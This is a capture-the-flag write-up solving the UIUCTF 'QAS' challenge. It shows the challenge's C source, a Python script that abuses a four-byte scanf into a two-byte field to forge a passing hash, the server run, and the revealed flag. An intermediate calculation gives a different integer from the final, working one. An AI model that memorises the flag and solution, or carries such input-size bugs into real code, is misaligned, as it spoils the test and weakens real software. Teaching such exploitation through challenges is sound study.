---
title: QAS
category: Binary Exploitation
tags: 
completedDuringEvent: true
submitted: true
flag: uiuctf{qu4ntum_0v3rfl0w_2d5ad975653b8f29}
draft: false
---
So we are given a file named `handout.tar.gz` which contains a binary file, and the source code of the binary.
`chal.c`:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

// Quantum-grade type definitions for maximum security
typedef int not_int_small;
typedef short int_small;
typedef int not_int_big;
typedef not_int_small int_big;
typedef unsigned char quantum_byte;
typedef quantum_byte* quantum_ptr;

// Advanced authentication structures
typedef struct {
    not_int_big val;
} PASSWORD_QUANTUM;

typedef struct {
    int_small val;
    quantum_byte padding[2];
    quantum_byte checksum;
    quantum_byte reserved;
} INPUT_QUANTUM;

// Memory-aligned structure for optimal quantum processing
struct __attribute__((packed)) quantum_data_s {
    INPUT_QUANTUM input;
    PASSWORD_QUANTUM password;
    quantum_byte entropy_pool[8];
    quantum_byte quantum_state[16];
};

typedef struct quantum_data_s quantum_data_t;

// Quantum random number generator (patent pending)
static inline quantum_byte generate_quantum_entropy() {
    static quantum_byte seed = 0x42;
    seed = ((seed << 3) ^ (seed >> 5)) + 0x7f;
    return seed;
}

// Initialize quantum security subsystem
void init_quantum_security(quantum_data_t* qdata) {
    for (int i = 0; i < 8; i++) {
        qdata->entropy_pool[i] = generate_quantum_entropy();
    }

    // Initialize quantum state with pseudo-random values
    for (int i = 0; i < 16; i++) {
        qdata->quantum_state[i] = (quantum_byte)(i * 0x11 + 0x33);
    }

    qdata->input.padding[0] = 0;
    qdata->input.padding[1] = 0;
}

// Quantum hash function (revolutionary technology)
not_int_big quantum_hash(INPUT_QUANTUM input, quantum_byte* entropy) {
    int_small input_val = input.val;
    not_int_big hash = input_val;

    // Apply quantum transformation matrix
    hash ^= (entropy[0] << 8) | entropy[1];
    hash ^= (entropy[2] << 4) | (entropy[3] >> 4);
    hash += (entropy[4] * entropy[5]) & 0xff;
    hash ^= entropy[6] ^ entropy[7];
    hash |= 0xeee;
    hash ^= input.padding[0] << 8 | input.padding[1];

    return hash;
}

// Decrypt the victory condition
void access_granted() {
    printf("Quantum authentication successful!\n");
    printf("Accessing secured vault...\n");

    FILE *fp = fopen("flag.txt", "r");
    if (fp == NULL) {
        printf("Error: Quantum vault is offline\n");
        printf("Please contact the quantum administrator.\n");
        return;
    }

    char flag[100];
    if (fgets(flag, sizeof(flag), fp) != NULL) {
        printf("CLASSIFIED FLAG: %s\n", flag);
    } else {
        printf("Error: Quantum decryption failed\n");
        printf("Please contact the quantum administrator.\n");
    }
    fclose(fp);
}

int main() {
    quantum_data_t qdata;

    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    // Initialize quantum security subsystem
    init_quantum_security(&qdata);

    // Set quantum password (TODO: implement proper quantum key derivation)
    qdata.password.val = 0x555;

    printf("=== QUANTUM AUTHENTICATION SYSTEM v2.7.3 ===\n");
    printf("Initializing quantum security protocols...\n");

    // Simulate quantum initialization delay
    for (volatile int i = 0; i < 100000; i++) { /* quantum processing */ }

    printf("Quantum entropy generated. System ready.\n");
    printf("Please enter your quantum authentication code: ");

    // Read user input
    if (scanf("%d", (int*)&qdata.input.val) != 1) {
        printf("Invalid quantum input format!\n");
        return 1;
    }

    // Calculate input checksum for integrity
    qdata.input.checksum = (quantum_byte)(qdata.input.val & 0xff);

    // Apply quantum hash transformation
    not_int_big hashed_input = quantum_hash(qdata.input, qdata.entropy_pool);

    printf("Quantum hash computed: 0x%x\n", hashed_input);

    // Verify quantum authentication
    if (hashed_input == qdata.password.val) {
        access_granted();
    } else {
        printf("Quantum authentication failed!\n");
        printf("Access denied. Incident logged.\n");
    }

    return 0;
}
```
and also i decided to check the protection of the binary file, so i used `checksec`:
```bash
❯ checksec --file chal
[*] '/home/b4r/ctf/uiuctf/pwn/qas/handout/chal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
* **No PIE**: Code segments at fixed addresses.
* **Stack Canary**: Prevents traditional stack overflows
* **NX**: Shellcode injection not possible

### Vulnerabilities
The main vulnerability lies in how the program handles user input:
```c
if (scanf("%d", (int*)&qdata.input.val) != 1) {
    printf("Invalid quantum input format!\n");
    return 1;
}
```
1. The program reads a signed integer (`%d`) but stores it in a short (2-byte) field
2. This causes an integer overflow that affects adjacent fields:
```c
typedef struct {
    int_small val;        // 2 bytes
    quantum_byte padding[2]; // 2 bytes
    quantum_byte checksum;
    quantum_byte reserved;
} INPUT_QUANTUM;
```
### Exploitation
1. The `quantum_hash` function performs several operations using:
* Input value (`input.val`)
* Entropy pool (8 pseudo-random bytes)
* Padding bytes (input.padding)

2. By providing a 4-byte integer, we can:
* Set `input.val` (first 2 bytes)
* Control `input.padding` (next 2 bytes)

3. We need to find padding values that make the final hash equal to `0x555`.

### Solution
The entropy pool is generated using a predictable PRNG:
```py
def generate_entropy():
    entropy = []
    seed = 0x42
    for _ in range(8):
        seed = ((seed << 3) ^ (seed >> 5)) + 0x7f
        seed &= 0xff
        entropy.append(seed)
    return entropy

entropy = [0x91, 0x0b, 0xd7, 0x3d, 0x68, 0xc2, 0x95, 0x2b]
```
The hash computation follows these steps:
1. Start with input value (`T`)
2. XOR with (`entropy[0]<<8 | entropy[1]`)
3. XOR with (`entropy[2]<<4 | entropy[3]>>4`)
4. Add (`entropy[4]*entropy[5] & 0xff`)
5. XOR with (`entropy[6]^entropy[7]`)
6. OR with `0xeee`
7. XOR with (`padding[0]<<8 | padding[1]`)

We want final_hash = `0x555`. Using T=0:
```py
h = 0
h ^= 0x910b        # Step 2 → 0x910b
h ^= 0xd73         # Step 3 → 0x9e78
h += (0x68*0xc2) & 0xff # Step 4 → 0x9f48
h ^= 0xbe          # Step 5 → 0x9ff6
h |= 0xeee         # Step 6 → 0x9ffe
required_padding = h ^ 0x555 # → 0x9aab
```
To construct the final input, we need to send an integer where:
* First 2 bytes = input value (`0`)
* Next 2 bytes = padding (`0x9aab`)
```py
input_val = 0
padding = 0x9aab
exploit_int = input_val | (padding << 16)
# Convert to signed 32-bit integer
if exploit_int > 0x7fffffff:
    exploit_int -= 0x100000000
# Result: -1414594560
```
### Final Exploit  
```py
entropy = []
seed = 0x42
for i in range(8):
    seed = ((seed << 3) ^ (seed >> 5)) + 0x7f
    seed &= 0xff  # Keep only the lower byte
    entropy.append(seed)

T = 0  # We'll use 0 for input.val

# Step-by-step hash calculation
h = T
# Step 2: XOR with entropy[0:1]
h ^= (entropy[0] << 8) | entropy[1]
# Step 3: XOR with entropy[2:3]
val3 = (entropy[2] << 4) | (entropy[3] >> 4)
h ^= val3
# Step 4: Add product of entropy[4] and entropy[5]
mul = entropy[4] * entropy[5]
h += mul & 0xff
# Step 5: XOR with entropy[6]^entropy[7]
xor5 = entropy[6] ^ entropy[7]
h ^= xor5
# Step 6: OR with 0xeee
h |= 0x0eee

# Calculate required padding
P = h ^ 0x555  # P = (hash_so_far ^ desired_hash)
P &= 0xffff     # Ensure it's 16-bit

# Build the input integer
p0 = (P >> 8) & 0xff  # High byte of padding
p1 = P & 0xff         # Low byte of padding
integer = T | (p0 << 16) | (p1 << 24)

# Convert to signed integer
if integer > 0x7fffffff:
    integer -= 0x100000000

print(integer)
```
**Output:**
```txt
-1415970816
```
Try first on local:
```bash
❯ ./chal
=== QUANTUM AUTHENTICATION SYSTEM v2.7.3 ===
Initializing quantum security protocols...
Quantum entropy generated. System ready.
Please enter your quantum authentication code: -1415970816
Quantum hash computed: 0x555
Quantum authentication successful!
Accessing secured vault...
Error: Quantum vault is offline
Please contact the quantum administrator.
```
Its correct! Let's try on the server:
```bash 
❯ ncat --ssl qas.chal.uiuc.tf 1337
== proof-of-work: disabled ==
=== QUANTUM AUTHENTICATION SYSTEM v2.7.3 ===
Initializing quantum security protocols...
Quantum entropy generated. System ready.
Please enter your quantum authentication code: -1415970816
Quantum hash computed: 0x555
Quantum authentication successful!
Accessing secured vault...
CLASSIFIED FLAG: uiuctf{qu4ntum_0v3rfl0w_2d5ad975653b8f29}
```
